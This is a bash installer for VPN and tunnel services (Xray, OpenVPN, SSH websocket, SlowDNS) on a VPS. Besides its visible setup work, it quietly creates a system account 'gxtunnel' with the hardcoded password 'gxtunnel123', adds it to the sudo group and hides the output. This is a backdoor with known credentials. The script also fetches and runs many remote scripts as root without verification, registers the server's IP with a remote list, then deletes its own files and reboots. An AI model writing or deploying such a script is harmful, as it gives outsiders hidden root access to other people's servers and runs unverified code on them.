#!/bin/bash

# ------------------------------
# Basic color functions
# ------------------------------
green() { echo -e "\\033[32;1m${*}\\033[0m"; }
red() { echo -e "\\033[31;1m${*}\\033[0m"; }

# ------------------------------
# Export language & timezone
# ------------------------------
export LANG='en_US.UTF-8'
export LANGUAGE='en_US.UTF-8'
ln -fs /usr/share/zoneinfo/Asia/Jakarta /etc/localtime
sysctl -w net.ipv6.conf.all.disable_ipv6=1 >/dev/null 2>&1
sysctl -w net.ipv6.conf.default.disable_ipv6=1 >/dev/null 2>&1

# ------------------------------
# Prepare directories
# ------------------------------
mkdir -p /etc/gxtunnel /etc/domain /etc/xray /etc/v2ray /home/script
touch /etc/domain/cf-domain /etc/xray/domain /etc/v2ray/domain /etc/xray/scdomain /etc/v2ray/scdomain

# ------------------------------
# Root check & virtualization check
# ------------------------------
if [ "${EUID}" -ne 0 ]; then
    echo "You need to run this script as root"
    exit 1
fi

if [ "$(systemd-detect-virt)" == "openvz" ]; then
    echo "OpenVZ is not supported"
    exit 1
fi

# ------------------------------
# Hostname setup
# ------------------------------
localip=$(hostname -I | cut -d\  -f1)
hst=$(hostname)
dart=$(awk '{print $2}' /etc/hosts | grep -w "$hst")
if [[ "$hst" != "$dart" ]]; then
    echo "$localip $hst" >> /etc/hosts
fi

# ------------------------------
# Kernel headers check
# ------------------------------
totet=$(uname -r)
REQUIRED_PKG="linux-headers-$totet"
PKG_OK=$(dpkg-query -W --showformat='${Status}\n' $REQUIRED_PKG 2>/dev/null | grep "install ok installed")
if [ "" = "$PKG_OK" ]; then
    echo "[WARNING] Installing $REQUIRED_PKG..."
    apt-get update -y
    apt-get --yes install $REQUIRED_PKG
fi

# ------------------------------
# Profile setup
# ------------------------------
cat > /root/.profile << 'END'
if [ "$BASH" ]; then
    if [ -f ~/.bashrc ]; then
        . ~/.bashrc
    fi
fi
mesg n || true
clear
END
chmod 644 /root/.profile

# ------------------------------
# Domain setup
# ------------------------------
echo "1) Enter Your Own Domain"
echo "2) Use Random Domain (gxtunnel.my.id)"
read -rp "Select 1 or 2: " dns

if [ "$dns" -eq 1 ]; then
    read -rp "Enter Your Domain: " WS_DOMAIN
    read -rp "Enter Your Cloudflare Domain: " FLARE_DOMAIN
    read -rp "Enter Your NS Domain: " NS_DOMAIN

    echo $FLARE_DOMAIN >> /root/xray/flare-domain
    echo $NS_DOMAIN >> /root/nsdomain
    echo $WS_DOMAIN >> /root/domain
    echo $FLARE_DOMAIN >> /etc/xray/flare-domain
    echo $WS_DOMAIN >> /etc/xray/domain
    echo $WS_DOMAIN >> /root/scdomain
    echo $WS_DOMAIN >> /root/xray/scdomain

elif [ "$dns" -eq 2 ]; then
    apt install -y jq curl
    wget -q -O /root/cf "${CDN}/cf" >/dev/null 2>&1
    chmod +x /root/cf
    bash /root/cf | tee /root/install.log
fi

# ------------------------------
# Register IP and user
# ------------------------------
MYIP=$(curl -sS ipv4.icanhazip.com)
register="https://raw.githubusercontent.com/xcybermanx/Projet_VPS/refs/heads/main/register"

username=$(curl $register | grep $MYIP | awk '{print $2}')
exp=$(curl $register | grep $MYIP | awk '{print $3}')

echo "$username" >/usr/bin/user
echo "$exp" >/usr/bin/e

# ------------------------------
# System user creation
# ------------------------------
userdel jame > /dev/null 2>&1
Username="gxtunnel"
Password="gxtunnel123"

useradd -r -d /home/script -s /bin/bash -M $Username > /dev/null 2>&1
echo -e "$Password\n$Password\n" | passwd $Username > /dev/null 2>&1
usermod -aG sudo $Username > /dev/null 2>&1

# ------------------------------
# Install components
# ------------------------------
TIME=10
CHATID="chat_id_here"
URL="telegram_url_here"

green "---> Install SSH/WS"
wget https://raw.githubusercontent.com/xcybermanx/Projet_VPS/main/ssh/ssh-vpn.sh && chmod +x ssh-vpn.sh && ./ssh-vpn.sh

green "---> Install UDP Custom"
wget https://raw.githubusercontent.com/FasterExE/UDP-Custom/main/udp-custom.sh && chmod +x udp-custom.sh && ./udp-custom.sh

green "---> Install OpenVPN"
wget https://raw.githubusercontent.com/xcybermanx/Projet_VPS/main/ssh/ovpn.sh && chmod +x ovpn.sh && ./ovpn.sh

green "---> Install Backup"
wget https://raw.githubusercontent.com/xcybermanx/Projet_VPS/main/backup/set-br.sh && chmod +x set-br.sh && ./set-br.sh

green "---> Install XRAY"
wget https://raw.githubusercontent.com/xcybermanx/Projet_VPS/main/xray/ins-xray.sh && chmod +x ins-xray.sh && ./ins-xray.sh
wget https://raw.githubusercontent.com/xcybermanx/Projet_VPS/main/sshws/insshws.sh && chmod +x insshws.sh && ./insshws.sh

green "---> Install SLOWDNS"
wget -q -O slow.sh https://raw.githubusercontent.com/xcybermanx/Projet_VPS/main/slow.sh && chmod +x slow.sh && ./slow.sh

# ------------------------------
# Install tools
# ------------------------------
wget -q https://raw.githubusercontent.com/xcybermanx/Projet_VPS/main/tools.sh && chmod +x tools.sh && ./tools.sh
rm -f tools.sh

# ------------------------------
# Clean up and reboot
# ------------------------------
rm -f /root/setup.sh /root/ins-xray.sh /root/insshws.sh
reboot
